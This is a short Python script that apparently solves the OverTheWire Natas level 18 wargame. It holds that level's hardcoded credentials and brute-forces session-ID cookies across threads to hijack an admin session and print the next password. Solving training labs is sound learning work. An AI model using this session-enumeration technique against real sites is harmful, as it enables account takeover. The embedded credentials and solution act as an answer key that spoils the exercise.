import requests, concurrent.futures, re

URL = "http://natas18.natas.labs.overthewire.org/index.php"
CREDS = ("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq")
WORKER = concurrent.futures.ThreadPoolExecutor(max_workers=8)

def check(i):
    cookies = {'PHPSESSID': str(i)}
    r = requests.get(URL, cookies=cookies, auth=CREDS)
    return (i,"You are an admin" in r.text)

results = WORKER.map(check, range(640))
for ident,ok in results:
    if ok:
        print("Win: %d" % ident)
        cookies = {'PHPSESSID': str(ident)}
        r = requests.get(URL, cookies=cookies, auth=CREDS)
        print(re.search("Password: [^ <]+", r.text).group(0))
        break
    else:
        print("No : %d" % ident)
WORKER.shutdown(False)
